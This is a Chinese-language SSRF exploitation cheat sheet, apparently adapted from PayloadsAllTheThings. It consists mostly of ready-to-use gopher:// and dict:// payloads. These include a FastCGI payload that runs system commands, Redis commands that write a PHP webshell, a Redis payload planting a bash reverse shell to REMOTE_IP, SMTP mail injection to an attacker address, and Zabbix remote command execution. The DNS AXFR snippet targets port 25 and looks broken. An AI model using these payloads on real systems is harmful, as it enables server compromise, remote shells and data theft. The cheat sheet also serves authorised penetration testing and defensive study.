# SSRF Advanced Exploitation - SSRF高级利用

[SEARCH_KEYWORDS]
漏洞类型: SSRF Advanced Exploitation 服务端请求伪造高级利用
攻击类型: RCE Remote Code Execution Webshell Reverse Shell
关键词: gopher dict FastCGI Redis MySQL SMTP WSGI Zabbix Memcached
协议: gopher:// dict://
技术: DNS AXFR Redis Webshell MySQL Execute SMTP Mail Send

[CONTENT]

## SSRF高级利用概述

某些服务(如Redis、Elasticsearch)在直接访问时允许未经认证的数据写入或命令执行。攻击者可以利用SSRF与这些服务交互，注入恶意payload如webshell或操纵应用程序状态。

## DNS AXFR区域传送

通过内部DNS解析器触发完整区域传送(AXFR)获取子域名列表。

```python
from urllib.parse import quote
domain,tld = "example.lab".split('.')
dns_request = b"\x01\x03\x03\x07"  # BITMAP
dns_request += b"\x00\x01"          # QCOUNT
# ... 构造DNS请求
print(f'gopher://127.0.0.1:25/_{quote(dns_request)}')
```

## FastCGI利用

需要知道服务器上PHP文件的完整路径，默认使用`/usr/share/php/PEAR.php`。

```powershell
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/usr/share/php/PEAR.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3F%3E%00%00%00%00
```

## Redis利用

### 写Webshell

```powershell
CONFIG SET dir /var/www/html
CONFIG SET dbfilename file.php
SET mykey "<?php system($_GET[0])?>"
SAVE
```

### 使用dict://协议

```powershell
dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
dict://127.0.0.1:6379/SAVE
```

### 使用gopher://协议获取反弹Shell

```powershell
gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22
gopher://127.0.0.1:6379/_save
```

## MySQL利用

MySQL用户需要无密码保护。

```powershell
# 使用Gopherus生成
python2.7 ./gopherus.py --exploit mysql
Give MySQL username: root
Give query to execute: SELECT 123;
```

## SMTP邮件发送

```powershell
gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
```

PHP重定向脚本示例：
```php
<?php
$commands = array(
    'HELO victim.com',
    'MAIL FROM: <admin@victim.com>',
    'RCPT To: <hacker@attacker.com>',
    'DATA',
    'Subject: @hacker!',
    'Hello Friend',
    '.'
);
$payload = implode('%0A', $commands);
header('Location: gopher://0:25/_'.$payload);
?>
```

## WSGI利用

```powershell
gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
```

## Zabbix利用

当`EnableRemoteCommands=1`启用时，允许执行远程命令。

```powershell
gopher://127.0.0.1:10050/_system.run%5B%28id%29%3Bsleep%202s%5D
```

## Memcached利用

Memcached默认在11211端口通信。

```powershell
python2.7 ./gopherus.py --exploit pymemcache
python2.7 ./gopherus.py --exploit phpmemcache
```

## 工具

- Gopherus - 生成gopher链接
- SSRFmap - SSRF利用工具

## 参考文档

原始来源: PayloadsAllTheThings/Server Side Request Forgery/SSRF-Advanced-Exploitation.md